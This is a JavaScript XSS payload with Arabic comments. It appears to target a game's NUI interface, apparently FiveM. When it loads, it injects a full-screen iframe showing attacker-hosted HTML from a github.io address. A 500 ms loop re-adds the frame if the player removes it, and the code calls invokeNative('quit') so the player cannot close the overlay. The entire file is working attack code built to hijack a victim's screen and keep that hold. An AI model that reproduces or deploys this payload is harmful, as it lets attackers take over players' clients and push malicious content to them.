// ===================================
// محتوى ملف: payload.js
// ===================================

// عنوان URL لملف HTML الذي تريد عرضه (يجب أن يكون على نفس السيرفر)
const MALICIOUS_HTML_URL = "https://dfjgiufdhgui.github.io/test/index.html"; 

// معرّف (ID) فريد للإطار لسهولة التحكم به
const IFRAME_ID = "xss_takeover_iframe"; 

// دالة لتنفيذ الاستغلال
function fullScreenTakeover() {
    // 1. إنشاء عنصر iframe
    const takeoverFrame = document.createElement('iframe');

    // 2. تعيين خصائص تغطية الشاشة بالكامل
    takeoverFrame.id = IFRAME_ID;
    takeoverFrame.src = MALICIOUS_HTML_URL;
    takeoverFrame.style.position = 'fixed';
    takeoverFrame.style.top = '0';
    takeoverFrame.style.left = '0';
    takeoverFrame.style.width = '100%';
    takeoverFrame.style.height = '100%';
    takeoverFrame.style.zIndex = '999999'; // لضمان الظهور فوق أي عنصر آخر
    takeoverFrame.style.border = 'none';

    // 3. إضافة الإطار إلى DOM (جسم الصفحة)
    document.body.appendChild(takeoverFrame);

    // 4. آلية لمنع الإزالة (Persistence)
    // هذا الكود يضمن إعادة إنشاء الإطار كل 500 مللي ثانية إذا حاول اللاعب إزالته يدويًا
    setInterval(() => {
        if (!document.getElementById(IFRAME_ID)) {
            document.body.appendChild(takeoverFrame);
        }
    }, 500);

    // 5. محاولة إرسال حدث 'ESCAPE' لمنع اللاعب من إغلاق NUI
    try {
        window.invokeNative('quit'); // محاولة إرسال أمر الخروج (كما في المقالة)
    } catch (e) {
        console.log("Could not invoke 'quit', proceeding with DOM takeover.");
    }
}

// تشغيل الدالة فوراً عند تحميل payload.js
fullScreenTakeover();